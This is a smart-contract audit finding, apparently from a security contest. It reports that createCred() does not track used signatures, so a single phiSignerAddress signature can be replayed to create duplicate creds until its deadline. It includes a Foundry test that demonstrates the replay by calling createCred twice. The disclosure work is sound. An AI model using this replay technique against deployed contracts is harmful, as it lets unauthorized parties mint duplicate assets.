# Vulnerability details

## Impact
Any user (sender) who was authorized by phiSignerAddress to create a cred can create multiple duplicate cred with a single signature.

## Proof of Concept
createCred() function allow any user to create cred if he got a signed data for this cred creation from phiSignerAddress but in the createCred() function there is no check whether a single signature is already used or not it only check for signature deadline. So, any user (sender) who is got a signature from phiSignerAddress can create multiple duplicate cred by calling createCred() function again and again until the signature deadline expired.

Here is foundry test case to check that we can create multiple duplicate cred using single signature:

Save this test in Cred.t.sol file and run `forge test --mt test_Siganture_Replay -vvv`:

```
function test_Siganture_Replay() external {
        vm.warp(START_TIME + 1);
        vm.startPrank(participant);
        uint256 credId = 1;
        uint256 supply = 0;
        uint256 amount = 1;
        uint256 expiresIn = START_TIME + 100;
        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(credId, supply, amount);
        string memory credURL = "test";
        bytes memory signCreateData = abi.encode(
            expiresIn, address(this), 31_337, address(bondingCurve), credURL, "BASIC", "SIGNATURE", 0x0
        );
        bytes32 createMsgHash = keccak256(signCreateData);
        bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
        (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
        if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
        vm.stopPrank();

        cred.createCred{ value: buyPrice }(participant, signCreateData, abi.encodePacked(cr, cs), 100, 100);
        console2.log("First Created Cred With the Signature, credID:", cred.credIdCounter());
        cred.createCred{ value: buyPrice }(participant, signCreateData, abi.encodePacked(cr, cs), 100, 100);
        console2.log("Second Created Cred With the same Signature, credID:", cred.credIdCounter());
    }
```
